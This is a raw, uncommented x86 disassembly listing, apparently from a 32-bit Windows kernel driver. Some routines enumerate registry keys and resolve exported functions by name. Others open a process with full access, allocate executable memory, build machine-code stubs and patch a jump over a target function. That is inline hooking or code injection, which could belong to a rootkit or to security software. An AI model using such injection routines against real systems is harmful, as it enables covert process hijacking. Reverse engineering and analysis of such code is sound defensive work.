   120e8:	push   esi
   120e9:	push   0x1
   120eb:	push   DWORD PTR [ebp-0xc]
   120ee:	call   0x116f2
   120f3:	call   eax
   120f5:	mov    edi,eax
   120f7:	cmp    edi,esi
   120f9:	jl     0x12146
   120fb:	mov    eax,DWORD PTR [ebp+0x8]
   120fe:	mov    DWORD PTR [ebp-0x18],eax
   12101:	lea    eax,[ebp-0x18]
   12104:	push   eax
   12105:	lea    eax,[ebp-0x38]
   12108:	push   eax
   12109:	push   0x200
   1210e:	lea    eax,[ebp-0x8]
   12111:	push   eax
   12112:	call   0x1169e
   12117:	call   eax
   12119:	mov    edi,eax
   1211b:	cmp    edi,esi
   1211d:	jl     0x12141
   1211f:	mov    eax,DWORD PTR [ebp-0x4]
   12122:	push   0x8
   12124:	mov    DWORD PTR [ebp-0x20],eax
   12127:	lea    eax,[ebp-0x20]
   1212a:	push   eax
   1212b:	push   0x9
   1212d:	push   DWORD PTR [ebp-0x8]
   12130:	mov    DWORD PTR [ebp-0x1c],esi
   12133:	call   0x11914
   12138:	call   eax
   1213a:	push   DWORD PTR [ebp-0x8]
   1213d:	mov    edi,eax
   1213f:	call   ebx
   12141:	push   DWORD PTR [ebp-0x4]
   12144:	call   ebx
   12146:	push   DWORD PTR [ebp-0xc]
   12149:	call   ebx
   1214b:	push   DWORD PTR [ebp-0x10]
   1214e:	call   ebx
   12150:	pop    ebx
   12151:	mov    eax,edi
   12153:	pop    edi
   12154:	pop    esi
   12155:	leave  
   12156:	ret    0x4
   12159:	int3   
   1215a:	int3   
   1215b:	int3   
   1215c:	int3   
   1215d:	int3   
   1215e:	mov    edi,edi
   12160:	push   ebp
   12161:	mov    ebp,esp
   12163:	sub    esp,0x43c
   12169:	mov    eax,ds:0x7eb38
   1216e:	xor    eax,ebp
   12170:	mov    DWORD PTR [ebp-0x4],eax
   12173:	mov    eax,DWORD PTR [ebp+0xc]
   12176:	push   ebx
   12177:	push   esi
   12178:	mov    esi,DWORD PTR [ebp+0x8]
   1217b:	push   edi
   1217c:	xor    ebx,ebx
   1217e:	push   0x3ff
   12183:	mov    DWORD PTR [ebp-0x418],eax
   12189:	lea    eax,[ebp-0x403]
   1218f:	push   ebx
   12190:	push   eax
   12191:	mov    DWORD PTR [ebp-0x424],esi
   12197:	mov    BYTE PTR [ebp-0x404],bl
   1219d:	call   0x1daf6
   121a2:	add    esp,0xc
   121a5:	lea    eax,[ebp-0x410]
   121ab:	push   eax
   121ac:	push   0x400
   121b1:	lea    eax,[ebp-0x404]
   121b7:	push   eax
   121b8:	push   ebx
   121b9:	push   ebx
   121ba:	push   esi
   121bb:	jmp    0x1236a
   121c0:	cmp    eax,ebx
   121c2:	jl     0x1238c
   121c8:	mov    eax,DWORD PTR [ebp-0x418]
   121ce:	lea    edx,[eax+0x2]
   121d1:	mov    cx,WORD PTR [eax]
   121d4:	inc    eax
   121d5:	inc    eax
   121d6:	cmp    cx,bx
   121d9:	jne    0x121d1
   121db:	mov    ecx,DWORD PTR [ebp-0x3f8]
   121e1:	sub    eax,edx
   121e3:	shr    ecx,1
   121e5:	sar    eax,1
   121e7:	lea    esi,[ecx+eax*1+0x2]
   121eb:	xor    ecx,ecx
   121ed:	push   0x2
   121ef:	pop    edx
   121f0:	mov    eax,esi
   121f2:	mul    edx
   121f4:	seto   cl
   121f7:	neg    ecx
   121f9:	or     ecx,eax
   121fb:	push   ecx
   121fc:	call   0x10a66
   12201:	mov    edi,eax
   12203:	lea    eax,[esi+esi*1]
   12206:	push   eax
   12207:	push   ebx
   12208:	push   edi
   12209:	mov    DWORD PTR [ebp-0x40c],edi
   1220f:	call   0x1daf6
   12214:	mov    eax,DWORD PTR [ebp-0x418]
   1221a:	add    esp,0x10
   1221d:	mov    ecx,eax
   1221f:	mov    dx,WORD PTR [eax]
   12222:	inc    eax
   12223:	inc    eax
   12224:	cmp    dx,bx
   12227:	jne    0x1221f
   12229:	sub    eax,ecx
   1222b:	dec    edi
   1222c:	mov    esi,ecx
   1222e:	dec    edi
   1222f:	mov    cx,WORD PTR [edi+0x2]
   12233:	inc    edi
   12234:	inc    edi
   12235:	cmp    cx,bx
   12238:	jne    0x1222f
   1223a:	mov    ecx,eax
   1223c:	shr    ecx,0x2
   1223f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12241:	mov    ecx,eax
   12243:	and    ecx,0x3
   12246:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   12248:	mov    edi,DWORD PTR [ebp-0x40c]
   1224e:	dec    edi
   1224f:	dec    edi
   12250:	mov    ax,WORD PTR [edi+0x2]
   12254:	inc    edi
   12255:	inc    edi
   12256:	cmp    ax,bx
   12259:	jne    0x12250
   1225b:	mov    esi,0x1de8a
   12260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12261:	mov    eax,DWORD PTR [ebp-0x3f8]
   12267:	shr    eax,1
   12269:	push   eax
   1226a:	lea    eax,[ebp-0x3f4]
   12270:	push   eax
   12271:	push   DWORD PTR [ebp-0x40c]
   12277:	call   0x1daea
   1227c:	mov    esi,DWORD PTR [ebp-0x40c]
   12282:	mov    eax,esi
   12284:	add    esp,0xc
   12287:	mov    DWORD PTR [ebp-0x41c],esi
   1228d:	lea    edx,[eax+0x2]
   12290:	mov    cx,WORD PTR [eax]
   12293:	inc    eax
   12294:	inc    eax
   12295:	cmp    cx,bx
   12298:	jne    0x12290
   1229a:	sub    eax,edx
   1229c:	sar    eax,1
   1229e:	add    eax,eax
   122a0:	mov    WORD PTR [ebp-0x41e],ax
   122a7:	mov    WORD PTR [ebp-0x420],ax
   122ae:	lea    eax,[ebp-0x420]
   122b4:	mov    DWORD PTR [ebp-0x434],eax
   122ba:	lea    eax,[ebp-0x43c]
   122c0:	push   eax
   122c1:	push   0xf003f
   122c6:	lea    eax,[ebp-0x414]
   122cc:	push   eax
   122cd:	mov    DWORD PTR [ebp-0x43c],0x18
   122d7:	mov    DWORD PTR [ebp-0x438],ebx
   122dd:	mov    DWORD PTR [ebp-0x430],0x40
   122e7:	mov    DWORD PTR [ebp-0x42c],ebx
   122ed:	mov    DWORD PTR [ebp-0x428],ebx
   122f3:	call   0x117c4
   122f8:	call   eax
   122fa:	push   esi
   122fb:	test   eax,eax
   122fd:	jl     0x12386
   12303:	push   DWORD PTR [ebp-0x414]
   12309:	call   0x1215e
   1230e:	push   esi
   1230f:	mov    BYTE PTR [ebp-0x405],al
   12315:	call   0x10a9a
   1231a:	pop    ecx
   1231b:	push   DWORD PTR [ebp-0x414]
   12321:	call   0x117ee
   12326:	call   eax
   12328:	test   eax,eax
   1232a:	jl     0x1238c
   1232c:	cmp    BYTE PTR [ebp-0x405],bl
   12332:	je     0x1238c
   12334:	push   0x3ff
   12339:	lea    eax,[ebp-0x403]
   1233f:	push   ebx
   12340:	push   eax
   12341:	mov    BYTE PTR [ebp-0x404],bl
   12347:	call   0x1daf6
   1234c:	add    esp,0xc
   1234f:	lea    eax,[ebp-0x410]
   12355:	push   eax
   12356:	push   0x400
   1235b:	lea    eax,[ebp-0x404]
   12361:	push   eax
   12362:	push   ebx
   12363:	push   ebx
   12364:	push   DWORD PTR [ebp-0x424]
   1236a:	mov    DWORD PTR [ebp-0x410],ebx
   12370:	call   0x11992
   12375:	call   eax
   12377:	cmp    eax,0x8000001a
   1237c:	jne    0x121c0
   12382:	mov    al,0x1
   12384:	jmp    0x1238e
   12386:	call   0x10a9a
   1238b:	pop    ecx
   1238c:	xor    al,al
   1238e:	mov    ecx,DWORD PTR [ebp-0x4]
   12391:	pop    edi
   12392:	pop    esi
   12393:	xor    ecx,ebp
   12395:	pop    ebx
   12396:	call   0x1da79
   1239b:	leave  
   1239c:	ret    0x8
   1239f:	int3   
   123a0:	int3   
   123a1:	int3   
   123a2:	int3   
   123a3:	int3   
   123a4:	mov    eax,ds:0x7ed3c
   123a9:	test   eax,eax
   123ab:	je     0x123bc
   123ad:	push   eax
   123ae:	call   0x11a10
   123b3:	call   eax
   123b5:	and    DWORD PTR ds:0x7ed3c,0x0
   123bc:	ret    
   123bd:	int3   
   123be:	int3   
   123bf:	int3   
   123c0:	int3   
   123c1:	int3   
   123c2:	push   0x28
   123c4:	push   0x7dee8
   123c9:	call   0x1db1c
   123ce:	xor    eax,eax
   123d0:	mov    DWORD PTR [ebp-0x28],eax
   123d3:	mov    DWORD PTR [ebp-0x2c],eax
   123d6:	mov    ebx,DWORD PTR [ebp+0x8]
   123d9:	cmp    ebx,eax
   123db:	jne    0x123e4
   123dd:	xor    eax,eax
   123df:	jmp    0x124c1
   123e4:	mov    DWORD PTR [ebp-0x4],eax
   123e7:	lea    ecx,[ebp-0x2c]
   123ea:	push   ecx
   123eb:	push   eax
   123ec:	push   0x1
   123ee:	push   ebx
   123ef:	call   0x118c0
   123f4:	call   eax
   123f6:	mov    edx,eax
   123f8:	sub    edx,ebx
   123fa:	mov    DWORD PTR [ebp-0x38],edx
   123fd:	mov    esi,DWORD PTR [eax+0x1c]
   12400:	add    esi,ebx
   12402:	mov    edi,DWORD PTR [eax+0x24]
   12405:	add    edi,ebx
   12407:	mov    ecx,DWORD PTR [eax+0x20]
   1240a:	add    ecx,ebx
   1240c:	and    DWORD PTR [ebp-0x20],0x0
   12410:	mov    ebx,DWORD PTR [ebp-0x20]
   12413:	cmp    ebx,DWORD PTR [eax+0x18]
   12416:	jae    0x124a9
   1241c:	movsx  ebx,WORD PTR [edi+ebx*2]
   12420:	cmp    ebx,DWORD PTR [eax+0x14]
   12423:	jae    0x1249d
   12425:	lea    ebx,[esi+ebx*4]
   12428:	mov    DWORD PTR [ebp-0x34],ebx
   1242b:	cmp    DWORD PTR [ebx],edx
   1242d:	jb     0x1243b
   1242f:	mov    ebx,DWORD PTR [ebp-0x2c]
   12432:	add    edx,ebx
   12434:	mov    ebx,DWORD PTR [ebp-0x34]
   12437:	cmp    DWORD PTR [ebx],edx
   12439:	jb     0x12492
   1243b:	mov    edx,DWORD PTR [ebp+0xc]
   1243e:	mov    DWORD PTR [ebp-0x30],edx
   12441:	mov    edx,DWORD PTR [ebp-0x20]
   12444:	mov    edx,DWORD PTR [ecx+edx*4]
   12447:	add    edx,DWORD PTR [ebp+0x8]
   1244a:	mov    DWORD PTR [ebp-0x24],edx
   1244d:	mov    dl,BYTE PTR [edx]
   1244f:	mov    ebx,DWORD PTR [ebp-0x30]
   12452:	cmp    dl,BYTE PTR [ebx]
   12454:	jne    0x1247f
   12456:	test   dl,dl
   12458:	je     0x1247b
   1245a:	mov    edx,DWORD PTR [ebp-0x24]
   1245d:	mov    dl,BYTE PTR [edx+0x1]
   12460:	mov    BYTE PTR [ebp-0x19],dl
   12463:	cmp    dl,BYTE PTR [ebx+0x1]
   12466:	jne    0x1247f
   12468:	mov    edx,DWORD PTR [ebp-0x24]
   1246b:	inc    edx
   1246c:	inc    edx
   1246d:	mov    DWORD PTR [ebp-0x24],edx
   12470:	inc    ebx
   12471:	inc    ebx
   12472:	mov    DWORD PTR [ebp-0x30],ebx
   12475:	cmp    BYTE PTR [ebp-0x19],0x0
   12479:	jne    0x1244d
   1247b:	xor    edx,edx
   1247d:	jmp    0x12484
   1247f:	sbb    edx,edx
   12481:	sbb    edx,0xffffffff
   12484:	test   edx,edx
   12486:	jne    0x12492
   12488:	mov    eax,DWORD PTR [ebp-0x34]
   1248b:	mov    eax,DWORD PTR [eax]
   1248d:	add    eax,DWORD PTR [ebp+0x8]
   12490:	jmp    0x124b7
   12492:	inc    DWORD PTR [ebp-0x20]
   12495:	mov    edx,DWORD PTR [ebp-0x38]
   12498:	jmp    0x12410
   1249d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   124a4:	jmp    0x123dd
   124a9:	mov    eax,DWORD PTR [ebp-0x28]
   124ac:	jmp    0x124ba
   124ae:	xor    eax,eax
   124b0:	inc    eax
   124b1:	ret    
   124b2:	mov    esp,DWORD PTR [ebp-0x18]
   124b5:	xor    eax,eax
   124b7:	mov    DWORD PTR [ebp-0x28],eax
   124ba:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   124c1:	call   0x1db61
   124c6:	ret    0x8
   124c9:	int3   
   124ca:	int3   
   124cb:	int3   
   124cc:	int3   
   124cd:	int3   
   124ce:	mov    edi,edi
   124d0:	push   ebp
   124d1:	mov    ebp,esp
   124d3:	sub    esp,0x48
   124d6:	mov    eax,DWORD PTR [ebp+0xc]
   124d9:	mov    eax,DWORD PTR [eax]
   124db:	push   edi
   124dc:	mov    DWORD PTR [ebp-0x30],eax
   124df:	lea    eax,[ebp-0x30]
   124e2:	push   eax
   124e3:	lea    eax,[ebp-0x48]
   124e6:	push   eax
   124e7:	xor    edi,edi
   124e9:	push   0x1f0fff
   124ee:	lea    eax,[ebp-0x10]
   124f1:	push   eax
   124f2:	mov    DWORD PTR [ebp-0x48],0x18
   124f9:	mov    DWORD PTR [ebp-0x44],edi
   124fc:	mov    DWORD PTR [ebp-0x3c],0x200
   12503:	mov    DWORD PTR [ebp-0x40],edi
   12506:	mov    DWORD PTR [ebp-0x38],edi
   12509:	mov    DWORD PTR [ebp-0x34],edi
   1250c:	mov    DWORD PTR [ebp-0x2c],edi
   1250f:	mov    DWORD PTR [ebp-0x10],edi
   12512:	call   0x1169e
   12517:	call   eax
   12519:	test   eax,eax
   1251b:	jl     0x1286f
   12521:	push   ebx
   12522:	push   esi
   12523:	mov    esi,DWORD PTR ds:0x1f040
   12529:	push   0x40
   1252b:	mov    ebx,0x1000
   12530:	push   ebx
   12531:	lea    eax,[ebp-0x14]
   12534:	push   eax
   12535:	push   edi
   12536:	lea    eax,[ebp-0xc]
   12539:	push   eax
   1253a:	push   DWORD PTR [ebp-0x10]
   1253d:	mov    DWORD PTR [ebp-0xc],edi
   12540:	mov    DWORD PTR [ebp-0x14],0x400
   12547:	call   esi
   12549:	test   eax,eax
   1254b:	jl     0x12556
   1254d:	mov    eax,DWORD PTR [ebp-0xc]
   12550:	mov    ecx,DWORD PTR [ebp+0xc]
   12553:	mov    DWORD PTR [ecx+0x8],eax
   12556:	push   0x4
   12558:	push   ebx
   12559:	lea    eax,[ebp-0x14]
   1255c:	push   eax
   1255d:	push   edi
   1255e:	lea    eax,[ebp-0x18]
   12561:	push   eax
   12562:	push   DWORD PTR [ebp-0x10]
   12565:	mov    DWORD PTR [ebp-0x18],edi
   12568:	mov    DWORD PTR [ebp-0x14],0x400
   1256f:	call   esi
   12571:	test   eax,eax
   12573:	jl     0x1257e
   12575:	mov    eax,DWORD PTR [ebp-0x18]
   12578:	mov    ecx,DWORD PTR [ebp+0xc]
   1257b:	mov    DWORD PTR [ecx+0xc],eax
   1257e:	lea    eax,[ebp-0x24]
   12581:	push   eax
   12582:	push   DWORD PTR [ebp-0x30]
   12585:	call   0x11cb0
   1258a:	call   eax
   1258c:	test   eax,eax
   1258e:	jl     0x1286d
   12594:	push   DWORD PTR [ebp-0x24]
   12597:	call   0x11a64
   1259c:	call   eax
   1259e:	mov    eax,DWORD PTR [ebp-0xc]
   125a1:	mov    DWORD PTR [ebp-0x20],edi
   125a4:	cmp    eax,edi
   125a6:	je     0x12853
   125ac:	mov    esi,DWORD PTR [ebp-0x18]
   125af:	cmp    esi,edi
   125b1:	je     0x127c0
   125b7:	push   0x214
   125bc:	push   edi
   125bd:	push   esi
   125be:	mov    DWORD PTR [ebp-0x4],eax
   125c1:	call   0x1daf6
   125c6:	mov    eax,DWORD PTR [ebp-0x4]
   125c9:	add    esp,0xc
   125cc:	push   0x60
   125ce:	lea    ebx,[esi+0xc]
   125d1:	push   eax
   125d2:	mov    DWORD PTR [ebx],edi
   125d4:	mov    DWORD PTR [esi],edi
   125d6:	mov    DWORD PTR [ebp-0x20],eax
   125d9:	call   0x19844
   125de:	push   0x68
   125e0:	push   eax
   125e1:	call   0x19844
   125e6:	push   ebx
   125e7:	push   eax
   125e8:	call   0x1985c
   125ed:	push   0x6a
   125ef:	pop    ebx
   125f0:	push   ebx
   125f1:	push   eax
   125f2:	call   0x19844
   125f7:	push   edi
   125f8:	push   eax
   125f9:	call   0x19844
   125fe:	push   ebx
   125ff:	push   eax
   12600:	call   0x19844
   12605:	push   edi
   12606:	push   eax
   12607:	call   0x19844
   1260c:	push   0x68
   1260e:	push   eax
   1260f:	call   0x19844
   12614:	push   edi
   12615:	push   eax
   12616:	mov    DWORD PTR [ebp-0x28],eax
   12619:	call   0x1985c
   1261e:	push   ebx
   1261f:	push   eax
   12620:	call   0x19844
   12625:	push   edi
   12626:	push   eax
   12627:	call   0x19844
   1262c:	push   ebx
   1262d:	push   eax
   1262e:	call   0x19844
   12633:	push   edi
   12634:	push   eax
   12635:	call   0x19844
   1263a:	push   0xb8
   1263f:	push   eax
   12640:	call   0x19844
   12645:	push   DWORD PTR ds:0x7ed88
   1264b:	push   eax
   1264c:	call   0x1985c
   12651:	mov    ebx,0xc00b
   12656:	push   ebx
   12657:	push   eax
   12658:	call   0x19876
   1265d:	push   0x74
   1265f:	push   eax
   12660:	call   0x19844
   12665:	push   0x9
   12667:	push   eax
   12668:	call   0x19844
   1266d:	mov    edi,0xd0ff
   12672:	push   edi
   12673:	push   eax
   12674:	call   0x19876
   12679:	push   0xb9
   1267e:	push   eax
   1267f:	call   0x19844
   12684:	lea    ecx,[esi+0x10]
   12687:	push   ecx
   12688:	push   eax
   12689:	call   0x1985c
   1268e:	push   0x189
   12693:	push   eax
   12694:	call   0x19876
   12699:	push   0x61
   1269b:	push   eax
   1269c:	call   0x19844
   126a1:	and    DWORD PTR [ebp-0x8],0x0
   126a5:	mov    DWORD PTR [ebp-0x4],eax
   126a8:	mov    eax,DWORD PTR [ebp+0x8]
   126ab:	mov    DWORD PTR [ebp-0x1c],eax
   126ae:	push   0x0
   126b0:	push   DWORD PTR [ebp-0x1c]
   126b3:	push   DWORD PTR [ebp-0x4]
   126b6:	call   0x19ffe
   126bb:	mov    ecx,eax
   126bd:	sub    ecx,DWORD PTR [ebp-0x1c]
   126c0:	mov    DWORD PTR [ebp-0x1c],eax
   126c3:	add    DWORD PTR [ebp-0x8],ecx
   126c6:	add    DWORD PTR [ebp-0x4],ecx
   126c9:	cmp    DWORD PTR [ebp-0x8],0x5
   126cd:	jb     0x126ae
   126cf:	mov    ecx,DWORD PTR [ebp+0x8]
   126d2:	push   DWORD PTR [ebp-0x4]
   126d5:	mov    eax,DWORD PTR [ebp-0x8]
   126d8:	add    eax,ecx
   126da:	push   eax
   126db:	call   0x198ba
   126e0:	push   eax
   126e1:	push   DWORD PTR [ebp-0x28]
   126e4:	mov    DWORD PTR [ebp-0x4],eax
   126e7:	call   0x1985c
   126ec:	mov    eax,DWORD PTR [ebp-0x4]
   126ef:	push   0xeb
   126f4:	push   eax
   126f5:	mov    DWORD PTR [esi],eax
   126f7:	call   0x19844
   126fc:	push   0x0
   126fe:	push   eax
   126ff:	mov    DWORD PTR [esi+0x4],eax
   12702:	call   0x19844
   12707:	push   0x68
   12709:	push   eax
   1270a:	call   0x19844
   1270f:	push   0x3e8
   12714:	push   eax
   12715:	call   0x1985c
   1271a:	push   0xb8
   1271f:	push   eax
   12720:	call   0x19844
   12725:	push   DWORD PTR ds:0x7ed8c
   1272b:	push   eax
   1272c:	call   0x1985c
   12731:	push   ebx
   12732:	push   eax
   12733:	call   0x19876
   12738:	push   0x74
   1273a:	push   eax
   1273b:	call   0x19844
   12740:	push   0x2
   12742:	push   eax
   12743:	call   0x19844
   12748:	push   edi
   12749:	push   eax
   1274a:	call   0x19876
   1274f:	push   eax
   12750:	push   DWORD PTR [esi]
   12752:	call   0x198ba
   12757:	mov    cl,al
   12759:	sub    cl,BYTE PTR [esi+0x4]
   1275c:	push   0x68
   1275e:	dec    cl
   12760:	push   eax
   12761:	mov    BYTE PTR [esi+0x8],cl
   12764:	call   0x19844
   12769:	add    esi,0x14
   1276c:	push   esi
   1276d:	push   eax
   1276e:	call   0x1985c
   12773:	push   0xb8
   12778:	push   eax
   12779:	call   0x19844
   1277e:	push   DWORD PTR ds:0x7ed80
   12784:	push   eax
   12785:	call   0x1985c
   1278a:	push   ebx
   1278b:	push   eax
   1278c:	call   0x19876
   12791:	push   0x74
   12793:	push   eax
   12794:	call   0x19844
   12799:	push   0x2
   1279b:	push   eax
   1279c:	call   0x19844
   127a1:	push   edi
   127a2:	push   eax
   127a3:	call   0x19876
   127a8:	push   0xc2
   127ad:	push   eax
   127ae:	call   0x19844
   127b3:	push   0x4
   127b5:	push   eax
   127b6:	call   0x19876
   127bb:	mov    eax,DWORD PTR [ebp-0xc]
   127be:	xor    edi,edi
   127c0:	cmp    eax,edi
   127c2:	je     0x12853
   127c8:	add    eax,0x400
   127cd:	lea    esi,[eax-0xc]
   127d0:	lea    ecx,[eax-0x8]
   127d3:	push   esi
   127d4:	lea    ebx,[eax-0x4]
   127d7:	lea    edx,[eax-0x10]
   127da:	push   0x40
   127dc:	add    eax,0xffffffe8
   127df:	push   ecx
   127e0:	mov    DWORD PTR [ebp-0x1c],eax
   127e3:	mov    eax,DWORD PTR [ebp+0x8]
   127e6:	mov    DWORD PTR [ebx],eax
   127e8:	push   ebx
   127e9:	mov    DWORD PTR [ecx],0x5
   127ef:	push   0xffffffff
   127f1:	mov    DWORD PTR [ebp-0x8],ecx
   127f4:	mov    DWORD PTR [ebp-0x28],edx
   127f7:	mov    DWORD PTR [esi],edi
   127f9:	call   DWORD PTR ds:0x7ecfc
   127ff:	test   eax,eax
   12801:	jl     0x12853
   12803:	mov    eax,DWORD PTR [ebp-0x20]
   12806:	sub    eax,DWORD PTR [ebp+0x8]
   12809:	sub    eax,0x5
   1280c:	push   eax
   1280d:	mov    eax,DWORD PTR [ebp-0x1c]
   12810:	inc    eax
   12811:	push   eax
   12812:	call   0x1985c
   12817:	push   0xe9
   1281c:	push   DWORD PTR [ebp-0x1c]
   1281f:	call   0x19844
   12824:	mov    eax,DWORD PTR [ebp-0x28]
   12827:	push   eax
   12828:	push   0x5
   1282a:	push   DWORD PTR [ebp-0x1c]
   1282d:	mov    DWORD PTR [eax],edi
   1282f:	push   DWORD PTR [ebp+0x8]
   12832:	push   0xffffffff
   12834:	call   DWORD PTR ds:0x7ecf0
   1283a:	mov    eax,DWORD PTR [ebp+0xc]
   1283d:	mov    BYTE PTR [eax+0x10],0x1
   12841:	lea    eax,[ebp-0x20]
   12844:	push   eax
   12845:	push   DWORD PTR [esi]
   12847:	push   DWORD PTR [ebp-0x8]
   1284a:	push   ebx
   1284b:	push   0xffffffff
   1284d:	call   DWORD PTR ds:0x7ecfc
   12853:	call   0x11a3a
   12858:	call   eax
   1285a:	call   0x11c86
   1285f:	mov    ecx,DWORD PTR [ebp-0x24]
   12862:	call   eax
   12864:	push   DWORD PTR [ebp-0x10]
   12867:	call   DWORD PTR ds:0x1f060
   1286d:	pop    esi
   1286e:	pop    ebx
   1286f:	pop    edi
   12870:	leave  
   12871:	ret    0x8
   12874:	int3   
   12875:	int3   
   12876:	int3   
   12877:	int3   
   12878:	int3   
   12879:	int3   
   1287a:	mov    edi,edi
   1287c:	push   ebp
   1287d:	mov    ebp,esp
   1287f:	sub    esp,0x18
   12882:	and    DWORD PTR [ebp-0x18],0x0
   12886:	push   edi
   12887:	xor    eax,eax
   12889:	lea    edi,[ebp-0x14]
   1288c:	stos   DWORD PTR es:[edi],eax
   1288d:	stos   DWORD PTR es:[edi],eax
   1288e:	stos   DWORD PTR es:[edi],eax
   1288f:	stos   DWORD PTR es:[edi],eax
   12890:	lea    eax,[ebp-0x18]
   12893:	push   eax
   12894:	push   0x1
   12896:	call   0x10ea4
   1289b:	pop    edi
   1289c:	test   al,al
   1289e:	je     0x128f6
   128a0:	cmp    DWORD PTR [ebp-0x18],0x0
   128a4:	je     0x128f6
   128a6:	lea    eax,[ebp-0x4]
   128a9:	push   eax
   128aa:	push   DWORD PTR [ebp-0x18]
   128ad:	call   0x11cb0
   128b2:	call   eax
   128b4:	test   eax,eax
   128b6:	jl     0x128f6
   128b8:	push   esi
   128b9:	push   DWORD PTR [ebp-0x4]
   128bc:	call   0x11a64
   128c1:	call   eax
   128c3:	mov    esi,DWORD PTR [ebp-0xc]
   128c6:	mov    eax,DWORD PTR [ebp+0x8]
   128c9:	lea    edx,[esi+0x14]
   128cc:	sub    edx,eax
   128ce:	movzx  ecx,WORD PTR [eax]
   128d1:	mov    WORD PTR [edx+eax*1],cx
   128d5:	inc    eax
   128d6:	inc    eax
   128d7:	test   cx,cx
   128da:	jne    0x128ce
   128dc:	mov    eax,DWORD PTR [esi+0x4]
   128df:	mov    cl,BYTE PTR [esi+0x8]
   128e2:	mov    BYTE PTR [eax],cl
   128e4:	call   0x11a3a
   128e9:	call   eax
   128eb:	call   0x11c86
   128f0:	mov    ecx,DWORD PTR [ebp-0x4]
   128f3:	call   eax
   128f5:	pop    esi
   128f6:	leave  
   128f7:	ret    0x4
   128fa:	int3   
   128fb:	int3   
   128fc:	int3   
   128fd:	int3   
   128fe:	int3   
   128ff:	int3   
   12900:	mov    edi,edi
   12902:	push   ebp
   12903:	mov    ebp,esp
   12905:	push   ecx
   12906:	and    DWORD PTR [ebp-0x4],0x0
   1290a:	push   ebx
   1290b:	push   esi
   1290c:	push   edi
   1290d:	mov    esi,0x1000
   12912:	push   0x20736649
   12917:	push   esi
   12918:	push   0x0
   1291a:	call   DWORD PTR ds:0x1f02c
   12920:	mov    edi,eax
   12922:	test   edi,edi
   12924:	je     0x12958
   12926:	lea    eax,[ebp-0x4]
   12929:	push   eax
   1292a:	push   esi
   1292b:	push   edi
   1292c:	push   DWORD PTR [ebp+0x8]
   1292f:	call   0x1179a
   12934:	call   eax
   12936:	mov    ebx,eax
   12938:	cmp    ebx,0xc0000004
   1293e:	jne    0x1294b
   12940:	push   0x0
   12942:	push   edi
   12943:	call   DWORD PTR ds:0x1f01c
   12949:	add    esi,esi
   1294b:	test   ebx,ebx
   1294d:	jne    0x12912
   1294f:	mov    eax,edi
   12951:	pop    edi
   12952:	pop    esi
   12953:	pop    ebx
   12954:	leave  
   12955:	ret    0x4
   12958:	xor    eax,eax
   1295a:	jmp    0x12951
   1295c:	int3   
   1295d:	int3   
   1295e:	int3   
   1295f:	int3   
   12960:	int3   
   12961:	int3   
   12962:	push   0x0
   12964:	push   0x7ed0c
   12969:	call   0x11c32
   1296e:	call   eax
   12970:	push   0x100
   12975:	push   0x0
   12977:	push   0x7ebd0
   1297c:	call   0x1daf6
   12981:	add    esp,0xc
   12984:	ret    
   12985:	int3   
   12986:	int3   
   12987:	int3   
   12988:	int3   
   12989:	int3   
   1298a:	mov    edi,edi
   1298c:	push   ebp
   1298d:	mov    ebp,esp
   1298f:	push   esi
   12990:	push   DWORD PTR [ebp+0xc]
   12993:	mov    esi,ecx
   12995:	push   DWORD PTR [ebp+0x8]
   12998:	call   0x110ae
   1299d:	mov    eax,esi
   1299f:	pop    esi
   129a0:	pop    ebp
   129a1:	ret    0x8
   129a4:	int3   
   129a5:	int3   
   129a6:	int3   
   129a7:	int3   
   129a8:	int3   
   129a9:	int3   
   129aa:	mov    edi,edi
   129ac:	push   ebp
   129ad:	mov    ebp,esp
   129af:	mov    eax,DWORD PTR [ebp+0x8]
   129b2:	push   esi
   129b3:	push   DWORD PTR [eax+0x4]
   129b6:	mov    esi,ecx
   129b8:	push   DWORD PTR [eax]
   129ba:	call   0x110ae
   129bf:	mov    eax,esi
   129c1:	pop    esi
   129c2:	pop    ebp
   129c3:	ret    0x4
   129c6:	int3   
   129c7:	int3   
   129c8:	int3   
   129c9:	int3   
   129ca:	int3   
   129cb:	int3   
   129cc:	mov    edi,edi
   129ce:	push   ebp
   129cf:	mov    ebp,esp
   129d1:	push   ebx
   129d2:	push   esi
   129d3:	push   edi
   129d4:	mov    edi,DWORD PTR [ebp+0x8]
   129d7:	mov    eax,DWORD PTR [edi+0x4]
   129da:	mov    esi,ecx
   129dc:	mov    ebx,DWORD PTR [esi]
   129de:	mov    DWORD PTR [esi+0x4],eax
   129e1:	inc    eax
   129e2:	push   eax
   129e3:	call   0x10a66
   129e8:	push   DWORD PTR [esi+0x4]
   129eb:	mov    DWORD PTR [esi],eax
   129ed:	push   DWORD PTR [edi]
   129ef:	push   eax
   129f0:	call   0x1dade
   129f5:	mov    eax,DWORD PTR [esi+0x4]
   129f8:	mov    ecx,DWORD PTR [esi]
   129fa:	push   ebx
   129fb:	mov    BYTE PTR [eax+ecx*1],0x0
   129ff:	call   0x10a9a
   12a04:	add    esp,0x14
   12a07:	pop    edi
   12a08:	mov    eax,esi
   12a0a:	pop    esi
   12a0b:	pop    ebx
   12a0c:	pop    ebp
   12a0d:	ret    0x4
   12a10:	int3   
   12a11:	int3   
   12a12:	int3   
   12a13:	int3   
   12a14:	int3   
   12a15:	int3   
   12a16:	mov    edi,edi
   12a18:	push   esi
   12a19:	push   edi
   12a1a:	push   0x20736649
   12a1f:	push   0x20
   12a21:	push   0x0
   12a23:	mov    esi,ecx
   12a25:	call   DWORD PTR ds:0x1f02c
   12a2b:	push   0x0
   12a2d:	mov    edi,eax
   12a2f:	push   0x1
   12a31:	mov    ecx,esi
   12a33:	mov    DWORD PTR [esi],edi
   12a35:	call   0x1110c
   12a3a:	mov    DWORD PTR [esi+0x8],eax
   12a3d:	mov    DWORD PTR [esi+0xc],edx
   12a40:	test   edi,edi
   12a42:	jne    0x12a4f
   12a44:	push   0xc000009a
   12a49:	call   DWORD PTR ds:0x1f014
   12a4f:	pop    edi
   12a50:	mov    eax,esi
   12a52:	pop    esi
   12a53:	ret    
   12a54:	int3   
   12a55:	int3   
   12a56:	int3   
   12a57:	int3   
   12a58:	int3   
   12a59:	int3   
   12a5a:	mov    edi,edi
   12a5c:	push   ebp
   12a5d:	mov    ebp,esp
